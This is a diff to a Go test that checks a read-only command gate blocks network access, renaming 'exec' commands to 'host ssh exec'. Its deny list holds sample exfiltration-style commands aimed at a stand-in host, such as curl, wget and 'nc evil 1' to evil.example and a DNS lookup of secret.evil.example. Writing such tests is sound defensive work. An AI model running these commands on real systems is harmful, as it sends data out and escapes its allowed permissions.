@@ -49,9 +49,9 @@ func TestGateNoNetwork(t *testing.T) {
 		"net check web 1.1.1.1:443", "net dns web secret.evil.example", "net http web https://evil.example/?d=x",
 		"net ports web", "network http web https://evil.example",
 		"cert check https://evil.example", "cert check web https://evil.example/x", "cert check smtps://evil.example",
-		"exec web --read-only -- curl https://evil.example", "exec web --read-only -- uptime",
+		"host ssh exec web --read-only -- curl https://evil.example", "host ssh exec web --read-only -- uptime",
 		"x web --read-only -- nslookup a.evil.example", "run web --read-only -- wget -qO- evil.example",
-		"exec web --read-only --script -", "exec web --read-only --cmd 'nc evil 1'",
+		"host ssh exec web --read-only --script -", "host ssh exec web --read-only --cmd 'nc evil 1'",
 		"job start web --read-only -- du -sh /var", "docker exec web app --read-only -- ls",
 		"cluster exec k8s pod/x --read-only -- ls", "recipe run my-df web", "recipe run disk web",
 		"-o json net http web https://evil.example", "--dry-run exec web --read-only -- uptime",
@@ -81,7 +81,7 @@ func TestGateNoNetwork(t *testing.T) {
 		"cache info c", "cluster run k8s get pods", "cluster status k8s", "cluster logs k8s api-1", "cert check web",
 		"cert check web --path /etc/ssl/site.pem", "pkg security web", "pkg installed web", "storage download s3 a.txt --to -",
 		"storage list s3", "job list", "audit", "export", "conn test pg", "vpn list", "cron list web", "user list web",
-		"net --help", "exec --help", "net", "cluster info k8s", "registry oci image list reg",
+		"net --help", "host ssh exec --help", "net", "cluster info k8s", "registry oci image list reg",
 	}
 	for _, line := range allowed {
 		if got := gateKeyAnswer(t, line, readKey); got != "" {
@@ -89,8 +89,8 @@ func TestGateNoNetwork(t *testing.T) {
 		}
 	}
 	// a write is refused as a write first: the hint names --read-only
-	if got := gateKeyAnswer(t, "exec web -- uptime", readKey); got != "SSH_GATE_READ_ONLY" {
-		t.Errorf("exec without --read-only: %q", got)
+	if got := gateKeyAnswer(t, "host ssh exec web -- uptime", readKey); got != "SSH_GATE_READ_ONLY" {
+		t.Errorf("host ssh exec without --read-only: %q", got)
 	}
 	words, _ := gateWords("net http web https://evil.example")
 	_, _, e := gateCheck(words, readKey)
